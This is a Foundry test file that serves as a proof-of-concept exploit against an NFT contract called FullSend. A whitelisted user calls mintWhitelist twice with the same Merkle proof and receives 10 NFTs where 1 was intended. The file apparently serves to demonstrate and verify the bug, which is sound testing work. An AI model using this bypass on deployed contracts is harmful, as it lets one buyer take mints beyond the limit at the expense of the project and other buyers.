// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/FullSend.sol";

contract Hack is Test {
    FullSend public nftContract;
    address public admin = vm.addr(1);
    address public whitelistUser = vm.addr(2);

    function setUp() external {

        //give everyone the sweet moneys
        vm.deal(admin, 100 ether);
        vm.deal(whitelistUser, 100 ether);

        vm.startPrank(admin);
        nftContract = new FullSend("ipfs://QmTfh19epr5BTeq5Qv4CF3M1ughVHgd7DYS37nfdRHbMF5/", "");

        //output from helpers/merkle_tree_generator.js
        nftContract.setWhitelistMerkleRoot(0x3dd73fb4bffdc562cf570f864739747e2ab5d46ab397c4466da14e0e06b57d56);
        nftContract.flipPresaleState();
        vm.stopPrank();
    }

    function testHack() public {
        vm.startPrank(whitelistUser);

        bytes32[] memory proof = new bytes32[](1);
        proof[0] = 0x3322f33946a3c503c916c8fc29768a547f01fa665e1eb22f9f66cf7e5a262012;
        nftContract.mintWhitelist{value: 3.75 ether}(proof, 5);
        nftContract.mintWhitelist{value: 3.75 ether}(proof, 5);

        vm.stopPrank();

        //the user that should only be able to get 1 NFT is able to get up to 10
        assertEq(nftContract.balanceOf(whitelistUser), 10);
    }
}